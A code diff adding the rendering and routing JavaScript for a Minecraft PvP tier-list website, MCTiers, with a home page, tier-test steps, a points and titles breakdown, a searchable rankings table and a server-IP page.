+  return `
+  <div class="card hero">
+    <div class="hero-l">
+      <img class="hlogo" src="https://mctiers.gg/icons/nav_skip.png" alt="MCTiers">
+      <h1>The Minecraft PvP Tier List</h1>
+      <p class="muted" style="font-size:17px;max-width:46ch">MCTiers is a Minecraft PvP tier list. Players are tested in eight gamemodes, placed in tiers from Tier 1 to Tier 5, and ranked on one overall leaderboard.</p>
+      <div style="display:flex;gap:10px;flex-wrap:wrap">
+        <a class="btn primary" href="#/rankings/overall">View rankings →</a>
+        <a class="btn ghost" href="#tier-test">Get tier tested</a>
+      </div>
+    </div>
+    <div class="hero-r">
+      <div class="sec-head" style="margin-bottom:10px">
+        <h2 style="font-size:13px;text-transform:uppercase;color:var(--muted);display:flex;gap:7px;align-items:center">
+          <img src="https://mctiers.gg/icons/tier_1.svg" width="15" alt="">Top players</h2>
+        <a class="more" href="#/rankings/overall">Full leaderboard →</a>
+      </div>
+      ${top}
+    </div>
+    <div class="sbar" style="grid-column:1/-1">
+      <div style="display:flex;align-items:center;gap:12px">
+        <img src="https://mctiers.gg/icons/header_trophy.avif" width="38" alt="">
+        <div>
+          <p style="font-size:11px;text-transform:uppercase;color:var(--muted);font-weight:700;margin-bottom:4px">Server IP</p>
+          <button class="ipbtn" data-ip="playmctiers.com">playmctiers.com
+            <span class="cp"><svg viewBox="0 0 16 16"><path d="M4 2a2 2 0 0 1 2-2h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2zm2-1a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1V2a1 1 0 0 0-1-1zM2 5a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1v-1h1v1a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h1v1z"/></svg></span>
+          </button>
+        </div>
+      </div>
+      <div><div style="display:flex;align-items:center;gap:9px"><span class="dot"></span>
+        <strong>Online</strong></div>
+        <p class="muted" style="font-size:13px">2,583 / 10,000 players online</p></div>
+      <p class="muted" style="font-size:13px">Java 1.21 - 26.3 · Bedrock</p>
+      <a class="more" style="margin-left:auto" href="#/server">Server IP →</a>
+    </div>
+  </div>
+
+  <section style="margin-top:40px">
+    <div class="sec-head"><h2>Gamemodes</h2></div>
+    <div class="modes">
+      ${MODES.map(([k,l])=>`<a class="mode" href="#/rankings/${k}">
+        <span class="box"><img src="${ICON(k)}" alt=""></span><span>${l}</span></a>`).join('')}
+    </div>
+  </section>
+
+  <section id="tier-test" class="card" style="margin-top:40px;padding:36px;display:grid;grid-template-columns:.85fr 1.15fr;gap:40px">
+    <div>
+      <h2 style="font-size:26px">Get tier tested</h2>
+      <p class="muted" style="margin:10px 0 16px">Tier tests happen in-game on <strong style="color:#ccc">playmctiers.com</strong>. Queue for a gamemode, fight one of our testers and get your tier.</p>
+      <button class="ipbtn" data-ip="playmctiers.com">playmctiers.com
+        <span class="cp"><svg viewBox="0 0 16 16"><path d="M4 2a2 2 0 0 1 2-2h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2zm2-1a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1V2a1 1 0 0 0-1-1zM2 5a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1v-1h1v1a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h1v1z"/></svg></span>
+      </button>
+    </div>
+    <ol style="list-style:none">
+      ${['Join playmctiers.com on Java (1.21 - 26.3) or Bedrock.',
+         'Type /tiertest and choose the gamemode you want to be tested in.',
+         "Pick your region to join that gamemode's testing queue.",
+         "When a tester in your region is free, you're moved to a private arena with the official kit.",
+         'Fight your tester. Your new tier is added to your MCTiers profile after the test.']
+        .map((s,i)=>`<li style="display:flex;gap:16px;margin-bottom:18px">
+          <span style="width:36px;height:36px;flex:none;border-radius:999px;border:2px solid var(--border);
+            background:${i===4?'var(--tier-1)':'var(--accent)'};color:${i===4?'var(--tier-1-fg)':'#ddd'};
+            display:grid;place-items:center;font-weight:800">${i+1}</span>
+          <p class="muted" style="padding-top:7px">${s}</p></li>`).join('')}
+    </ol>
+  </section>
+
+  <section class="tp-grid" style="margin-top:40px">
+    <div class="card" style="padding:22px">
+      <h2>Tiers and points</h2>
+      <p class="muted" style="margin:6px 0 18px;font-size:14px">Each gamemode ranks players in five tiers, split into <strong style="color:#ccc">High</strong> and <strong style="color:#ccc">Low</strong>. Your tiers earn points, and points decide your place on the overall leaderboard.</p>
+      ${TIERS.map(([n,h,l])=>`<div class="tierrow" style="background:var(--tier-${n});color:var(--tier-${n}-fg)">
+        ${n<=3?`<img src="https://mctiers.gg/icons/tier_${n}.svg" alt="">`:''}
+        <span style="font-size:16px">Tier ${n}</span>
+        <span class="pts"><span><svg viewBox="0 0 24 24"><path d="M6 17.59 7.41 19 12 14.42 16.59 19 18 17.59l-6-6z"/><path d="m6 11 1.41 1.41L12 7.83l4.59 4.58L18 11l-6-6z"/></svg>${h}</span>
+        <span><svg viewBox="0 0 24 24"><path d="M7.41 15.41 12 10.83l4.59 4.58L18 14l-6-6-6 6z"/></svg>${l}</span></span>
+      </div>`).join('')}
+    </div>
+    <div class="card" style="padding:22px">
+      <h2>Titles</h2>
+      <p class="muted" style="margin:6px 0 18px;font-size:14px">Your title follows your total points across every gamemode.</p>
+      ${TITLES.map(([f,n,req,c,w])=>`<div class="tl">
+        <img src="https://mctiers.gg/titles/${f}.${f==='combat_specialist'||f==='combat_cadet'||f==='combat_novice'||f==='rookie'?'svg':'webp'}" alt="">
+        <div class="grow"><div class="lbl"><span style="color:${c}">${n}</span><span>${req}</span></div>
+        <div class="bar"><i style="width:${w}%;background:${c}"></i></div></div>
+      </div>`).join('')}
+    </div>
+  </section>
+
+  <section id="faq" style="margin-top:40px">
+    <div class="sec-head"><div><h2>Frequently asked questions</h2>
+      <p class="muted" style="font-size:14px">Quick answers about tiers, tier tests, points and the MCTiers server.</p></div></div>
+    <div class="card" style="overflow:hidden">
+      ${FAQ.map(([q,a],i)=>`<details${i===0?' open':''} name="faq">
+        <summary><span class="num">0${i+1}</span>${q}<span class="pm">+</span></summary>
+        <p>${a}</p></details>`).join('')}
+    </div>
+  </section>`;
+}
+
+function viewRankings(mode){
+  const isOverall = mode === 'overall';
+  const label = isOverall ? 'Overall' : (MODES.find(m=>m[0]===mode)?.[1] || 'Overall');
+  let rows = PLAYERS.slice();
+  if (!isOverall) rows = rows.filter(p => p.t[mode]);
+  if (!isOverall) rows.sort((a,b)=>(PTS[b.t[mode]]||0)-(PTS[a.t[mode]]||0));
+  const q = (document.getElementById('q').value || '').toLowerCase().trim();
+  if (q) rows = rows.filter(p => p.name.toLowerCase().includes(q));
+
+  return `
+  <div style="display:flex;gap:6px;flex-wrap:wrap;margin-bottom:22px">
+    ${[['overall','Overall'],...MODES].map(([k,l])=>`<a class="btn ghost" style="height:38px;padding:0 12px;font-size:13px;font-weight:600;${k===mode?'border-color:#555;color:#fff':''}" href="#/rankings/${k}"><img src="${ICON(k)}" style="width:15px" alt="">${l}</a>`).join('')}
+  </div>
+  <h1>${isOverall?'Overall Minecraft PvP Rankings':label+' Tier List'}</h1>
+  <p class="muted" style="margin:8px 0 18px">${rows.length} players ranked${isOverall?' by points across 8 gamemodes':', from HT1 to LT5'}</p>
+  <div class="notice"><b>ⓘ</b> Tiers are updated by testers. Press <b>/</b> anywhere to search a player.</div>
+  <div class="card" style="overflow:hidden">
+    <table class="rtable">
+      <thead><tr><th>#</th><th>Player</th><th>Region</th><th>Tiers</th></tr></thead>
+      <tbody>
+      ${rows.length ? rows.map((p,i)=>`<tr>
+        <td class="rk">${i+1}.</td>
+        <td><div class="pcell"><img class="sk" src="${skin(p.name)}" alt="" loading="lazy">
+          <div><div class="nm">${p.name}</div>
+          <div class="tt"><img src="https://mctiers.gg/titles/${TITLES.find(t=>t[1]===p.title)[0]}.webp" alt="">
+            ${p.title} <span class="muted">(${p.pts})</span></div></div></div></td>
+        <td><span class="reg ${p.reg.toLowerCase()}" style="width:36px;height:36px;display:grid;place-items:center;border-radius:7px;font-weight:800;font-size:12px">${p.reg}</span></td>
+        <td><div class="tset">${tierSet(p.t)}</div></td>
+      </tr>`).join('') : `<tr><td colspan="4"><div class="empty">No players match that search.</div></td></tr>`}
+      </tbody>
+    </table>
+  </div>`;
+}
+
+/* ---- router ---- */
+function render(){
+  const hash = location.hash.replace(/^#/,'') || '/';
+  const app = document.getElementById('app');
+  document.getElementById('nav-home').classList.toggle('on', hash === '/');
+  document.getElementById('nav-rank').classList.toggle('on', hash.startsWith('/rankings'));
+  if (hash.startsWith('/rankings/')) {
+    app.innerHTML = viewRankings(hash.split('/')[2] || 'overall');
+  } else if (hash === '/server') {
+    app.innerHTML = `<h1>MCTiers Server IP</h1>
+      <p class="muted" style="margin:10px 0 20px">The MCTiers Minecraft server IP is <b style="color:#ddd">playmctiers.com</b>. Java players can join on any version from 1.21 - 26.3, and Bedrock players can join on port 19132.</p>
+      <div class="card" style="padding:26px;max-width:520px">
+        <p style="font-size:11px;text-transform:uppercase;color:var(--muted);font-weight:700;margin-bottom:8px">Server address</p>
+        <button class="ipbtn" data-ip="playmctiers.com">playmctiers.com
+          <span class="cp"><svg viewBox="0 0 16 16"><path d="M4 2a2 2 0 0 1 2-2h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2zm2-1a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1V2a1 1 0 0 0-1-1zM2 5a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1v-1h1v1a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h1v1z"/></svg></span>
+        </button>
+        <p class="muted" style="margin-top:14px;font-size:14px">Bedrock port: <b style="color:#ddd">19132</b></p>
+      </div>`;
+  } else {
+    app.innerHTML = viewHome();
+  }
+  window.scrollTo(0,0);
+}
+
+/* ---- events ---- */
+document.addEventListener('click', e => {
+  const ip = e.target.closest('[data-ip]');
+  if (ip) { navigator.clipboard.writeText(ip.dataset.ip).then(()=>toast('Server IP copied')); }
+});
+const q = document.getElementById('q');
+q.addEventListener('input', () => { if (location.hash.startsWith('#/rankings')) render(); });
+document.addEventListener('keydown', e => {
+  if (e.key === '/' && document.activeElement !== q) { e.preventDefault(); q.focus(); }
+});
+window.addEventListener('hashchange', render);
+render();
+</script>
+</body>
+</html>
